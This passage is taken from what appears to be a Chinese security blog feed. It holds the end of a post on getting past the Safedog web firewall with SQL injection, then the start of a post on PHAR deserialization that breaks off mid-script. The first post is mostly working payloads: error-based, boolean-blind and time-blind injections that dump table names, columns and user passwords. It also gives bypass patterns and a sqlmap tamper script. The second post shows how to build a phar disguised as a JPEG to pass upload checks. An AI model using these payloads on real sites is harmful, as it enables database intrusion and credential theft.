<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%27%26%26updatexml/*!/*/*!%0i*/(1,concat(0x7e,(select%20group_concat(/*!table_name*/)%20from%20information_schema.tables where table_schema=0x7365637572697479),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p>并且根据报错要去掉updatexml外面的注释</p>
<p><img src="/2020/06/05/sql-Fuzz/1591340857815.png" alt="1591340857815"></p>
<p><strong>列名</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%27%26%26updatexml/*!/*/*!%0i*/(1,concat(0x7e,(select%20group_concat(/*!column_name*/)%20from%20information_schema.columns where table_name=0x7573657273),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/sql-Fuzz/1591341094057.png" alt="1591341094057"></p>
<p><strong>查数据</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%27%26%26updatexml/*!/*/*!%0i*/(1,concat(0x7e,(select%20group_concat(/*!id,username,password*/)%20from%20users),0x7e),1)--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/05/sql-Fuzz/1591341154503.png" alt="1591341154503"></p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>payload:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">#数据库名</span></span><br><span class="line">?id=1'%26%26ascii(substr(database<span class="comment">/**/</span>(),1,1))=30<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#表名(去除最外层注释)</span></span><br><span class="line">?id=1'%26%26ascii(substr((<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(<span class="comment">/*!table_name*/</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.tables%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_schema=<span class="number">0x7365637572697479</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">30</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#列名</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'%26%26ascii(substr((select%20group_concat(/*!column_name*/)%20from%20information_schema.columns where table_name=0x7573657273),1,1))=30--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#数据</span></span><br><span class="line"><span class="string">?id=1'</span>%<span class="number">26</span>%<span class="number">26</span><span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(<span class="comment">/*!id,username,password*/</span>)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">30</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>



<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>使用if三段式判断<br>过滤了if()和sleep()<br>sleep()使用<code>sleep/**/()</code>绕过<br>if()使用<code>/*!if/*!/*/*!%0i*/()*/</code>绕过<br>payload：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1'%26%26/*!if/*!/*/*!%0i*/(length(database/**/())=8,sleep/**/(5),1)*/--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据库名</span></span><br><span class="line">?id=1'%26%26/*!if/*!/*/*!%0i*/(ascii(substr(database/**/(),1,1))=115,1,sleep/**/(5))*/--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#表名(去除最外层注释)</span></span><br><span class="line">?id=1'%26%26if/*!/*/*!%0i*/(ascii(substr((select%20group_concat(/*!table_name*/)%20from%20information_schema.tables%20where%20table_schema=0x7365637572697479),1,1))&gt;115000,1,sleep/**/(5))--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#列名</span></span><br><span class="line">?id=1'%26%26if/*!/*/*!%0i*/(ascii(substr((select%20group_concat(/*!column_name*/)%20from%20information_schema.columns where table_name=0x7573657273),1,1))&gt;115000,1,sleep/**/(5))--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据</span></span><br><span class="line">?id=1'%26%26if/*!/*/*!%0i*/(ascii(substr((select%20group_concat(/*!id,username,password*/)%20from%20users),1,1))&gt;115,1,sleep/**/(5))--+</span><br></pre></td></tr></table></figure>

<p>绕过安全狗的payload还有很多，几乎上面fuzz出来的字符串都可以用作下面的绕过</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有几个万能绕过的payload：<br>安全狗会正则想要ban掉的字符，比如如果将一个参数分割之后union select两个单词顺序出现就会ban掉，这里就利用正则的缺陷，让union或select不能单独分离出来，就可以绕过，比如这几个payload：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#针对两个关键字连用或者函数</span></span><br><span class="line"><span class="regexp">/*!union/</span>*!<span class="regexp">/*/</span>**<span class="regexp">/*/</span>select<span class="regexp">/**/</span></span><br><span class="line"><span class="regexp">/*!database/</span>*!<span class="regexp">/*/</span>**<span class="regexp">/*/</span>()<span class="regexp">/**/</span></span><br><span class="line"><span class="regexp">/*!order/</span>*!<span class="regexp">/*/</span>**<span class="regexp">/*/</span>by<span class="regexp">/**/</span></span><br><span class="line"><span class="comment">#针对单独的一个关键字</span></span><br><span class="line"><span class="regexp">/*!union/</span>*!<span class="regexp">/*/</span>**<span class="regexp">/*/</span></span><br><span class="line"><span class="regexp">/*!updatexml/</span>*!<span class="regexp">/*/</span>**<span class="regexp">/*/</span></span><br><span class="line"><span class="regexp">/*!extractvalue/</span>*!<span class="regexp">/*/</span>**<span class="regexp">/*/</span></span><br></pre></td></tr></table></figure>

<p>以上亲测好用，我觉得有这种payload，安全狗就是纸窗户qwq。</p>
<p>最后附上tamper脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">"="</span>,<span class="string">"/*!*/=/*!*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"ORDER"</span>,<span class="string">"/*!ORDER/*!/*/**/*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"AND"</span>,<span class="string">"/*!AND/*!/*/**/*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"OR"</span>,<span class="string">"/*!OR/*!/*/**/*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION"</span>,<span class="string">"/*!UNION/*!/*/**/*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"SELECT"</span>,<span class="string">"/*!SELECT/*!/*/**/*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"USER()"</span>,<span class="string">"/*!USER/*!/*/**/*/()/**/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"DATABASE()"</span>,<span class="string">"/*!DATABASE/*!/*/**/*/()/**/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"VERSION()"</span>,<span class="string">"/*!VERSION/*!/*/**/*/()/**/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"SESSION_USER()"</span>,<span class="string">"/*!SESSION_USER/*!/*/**/*/()/**/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"EXTRACTVALUE"</span>,<span class="string">"/*!EXTRACTVALUE/*!/*/**/*/()/**/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"UPDATEXML"</span>,<span class="string">"/*!UPDATEXML/*!/*/**/*/"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>参考文章：</p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/7449#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/7449#toc-6</a></p>
<p><a href="https://bbs.d0g3.cn/d/33" target="_blank" rel="noopener">https://bbs.d0g3.cn/d/33</a></p>
<p><a href="https://www.fuzzer.xyz/2019/03/30/FUZZ%E6%B5%8B%E8%AF%95%E6%9F%90%E7%8B%97WAF%E7%BB%95%E8%BF%87/#%E6%AD%A3%E6%96%87" target="_blank" rel="noopener">https://www.fuzzer.xyz/2019/03/30/FUZZ%E6%B5%8B%E8%AF%95%E6%9F%90%E7%8B%97WAF%E7%BB%95%E8%BF%87/#%E6%AD%A3%E6%96%87</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>SQL注入绕waf</tag>
      </tags>
  </entry>
  <entry>
    <title>phar反序列化学习</title>
    <url>/2020/04/10/phar/</url>
    <content><![CDATA[<p>PHAR反序列化学习<a id="more"></a></p>
<h1 id="PHAR介绍"><a href="#PHAR介绍" class="headerlink" title="PHAR介绍"></a>PHAR介绍</h1><h2 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h2><p>phar文件是一种压缩文件，不需要解压即可以运行php应用。用户自定义的meta-data会以序列化形式存储在phar文件中的manifest部分；当使用phar://协议来解析phar文件时，便会对phar文件中的manifest部分进行反序列化。其反序列化原因是，在PHP源码phar.c#618处，调用了：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php<span class="constructor">_var_unserialize(<span class="params">metadata</span>, &amp;<span class="params">p</span>, <span class="params">p</span> + <span class="params">zip_metadata_len</span>, &amp;<span class="params">var_hash</span>)</span>) &#123;</span><br></pre></td></tr></table></figure>

<h2 id="phar文件结构："><a href="#phar文件结构：" class="headerlink" title="phar文件结构："></a>phar文件结构：</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>stub</span><br><span class="line">	phar 扩展识别的标志 格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>manifest</span><br><span class="line">	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化		的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>contents</span><br><span class="line">	压缩文件的内容</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>signature</span><br><span class="line">	文件的签名内容</span><br></pre></td></tr></table></figure>

<h2 id="phar的简单使用"><a href="#phar的简单使用" class="headerlink" title="phar的简单使用"></a>phar的简单使用</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $name;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"CyzCc"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);<span class="comment">//定义phar文件的文件名</span></span><br><span class="line">    $phar-&gt;startBuffering();<span class="comment">// 启动缓冲Phar写操作</span></span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置存根，即设置a stub的内容</span></span><br><span class="line"><span class="comment">// 增加gif文件头</span></span><br><span class="line"><span class="comment">/* $phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); */</span></span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $o-&gt;name = <span class="string">"test"</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o);<span class="comment">//设置phar归档元数据</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);<span class="comment">//以字符串的形式添加一个文件到 phar 档案//停止缓冲对Phar归档文件的写请求，并将更改保存到磁盘</span></span><br><span class="line">    $phar-&gt;stopBuffering();<span class="comment">//停止缓冲对Phar归档文件的写请求，并将更改保存到磁盘</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里可能会报错：</p>
<blockquote>
<p>disabled by the php.ini setting phar.readonly</p>
</blockquote>
<p>改一下php.ini就可以了</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[Phar]</span></span><br><span class="line"><span class="comment">; http://php.net/phar.readonly</span></span><br><span class="line"><span class="attr">phar.readonly</span> = <span class="literal">Off</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/10/phar/1.png" alt><br>从上面可以看到，有一部分是序列化之后的内容，也就是<code>manifest</code>或者说是<code>meta-data</code>phar序列化原理</p>
<p>如果要求上传真实图片，我们可以通过以下脚本构造，这样就可以生成一张正常的图片来绕过<code>getimagesize</code>的检测</p>
<p>可以通过这个思路构造一个图片以下是脚本：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="formula">$jpeg_header_size = </span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xd</span></span>8<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xe</span></span>0<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>4a<span class="tag">\<span class="name">x</span></span>46<span class="tag">\<span class="name">x</span></span>49<span class="tag">\<span class="name">x</span></span>46<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>48<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xfe</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>13".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>43<span class="tag">\<span class="name">x</span></span>72<span class="tag">\<span class="name">x</span></span>65<span class="tag">\<span class="name">x</span></span>61<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>65<span class="tag">\<span class="name">x</span></span>64<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">x</span></span>77<span class="tag">\<span class="name">x</span></span>69<span class="tag">\<span class="name">x</span></span>74<span class="tag">\<span class="name">x</span></span>68<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">x</span></span>47<span class="tag">\<span class="name">x</span></span>49<span class="tag">\<span class="name">x</span></span>4d<span class="tag">\<span class="name">x</span></span>50<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xdb</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>43<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>02".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">x</span></span>06<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>0d<span class="tag">\<span class="name">x</span></span>0e<span class="tag">\<span class="name">x</span></span>12<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>0d<span class="tag">\<span class="name">x</span></span>0e<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>0e<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>16<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>13<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>15<span class="tag">\<span class="name">x</span></span>15".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>15<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>0f<span class="tag">\<span class="name">x</span></span>17<span class="tag">\<span class="name">x</span></span>18<span class="tag">\<span class="name">x</span></span>16<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>18<span class="tag">\<span class="name">x</span></span>12<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>15<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xdb</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>43<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>04<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>09<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>09<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>0d<span class="tag">\<span class="name">x</span></span>0b<span class="tag">\<span class="name">x</span></span>0d<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>2<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0a<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>01".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>15<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>0c<span class="tag">\<span class="name">x</span></span>03".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>95<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>07<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>05<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>11".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>03<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>11<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>20".</span></span><br><span class="line"><span class="formula">"<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xda</span></span><span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>08<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>02<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>3f<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>1f<span class="tag">\<span class="name">xff</span></span><span class="tag">\<span class="name">xc</span></span>4<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>14<span class="tag">\<span class="name">x</span></span>10<span class="tag">\<span class="name">x</span></span>01<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span class="name">x</span></span>00<span class="tag">\<span 